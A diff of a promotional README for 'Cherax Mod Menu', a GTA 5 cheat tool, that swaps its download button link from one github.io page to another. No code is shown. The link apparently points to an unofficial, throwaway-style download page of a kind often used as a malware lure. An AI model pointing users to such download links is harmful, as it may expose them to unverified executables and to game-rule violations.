@@ -2,7 +2,7 @@
 
 Cherax Mod Menu is a powerful and versatile modification tool tailored for GTA 5 players who seek to elevate their gameplay experience with advanced features and easy-to-use controls. This mod menu offers a wide range of enhancements from visual overlays to teleportation and vehicle spawning, allowing users to fully customize their game environment and enjoy more freedom in gameplay.
 
-[![Download Cherax Mod Menu](https://img.shields.io/badge/Download-Cherax_Mod_Menu-darkorange)](https://asdeennerhorse.github.io/mogus/CheraxMod)
+[![Download Cherax Mod Menu](https://img.shields.io/badge/Download-Cherax_Mod_Menu-darkorange)](https://cherax-mod-menu-cheat.github.io/.github)
 
 ---
 
